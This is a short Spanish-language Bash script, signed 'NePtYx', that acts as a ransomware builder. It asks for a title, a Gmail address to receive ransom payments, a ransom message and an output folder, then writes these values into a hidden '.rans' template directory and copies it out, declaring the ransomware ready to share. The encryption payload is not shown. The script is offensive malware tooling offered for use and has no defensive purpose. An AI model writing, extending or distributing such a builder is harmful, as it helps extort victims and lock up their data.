#by NePtYx
#Formulario de creacion
bash .banner
echo "Introduce el titulo del programa:"
read input
bash .banner
echo "Introduce tu gmail que debe llegar el pago:"
read input1
bash .banner
echo "Introduce el mensaje que dira tu ransomware:"
read input2
bash .banner
echo "Introduce el nombre de tu carpeta que contendra el ransomware:"
read input3
bash .banner
echo "Ya esta listo tu ransomwarem para ser compartido."
echo "Este se encuentra en la carpeta llamada $input3..."
#Procesos de la creacion
cd .rans
echo "$input" |& tee .banner
echo "$input1" |& tee .rec
echo "$input2" |& tee .msg
cd ..
cp .rans -r $input3
#Salida de ejecucion
bash .banner
echo "Deseas salir del programa?"
read input4
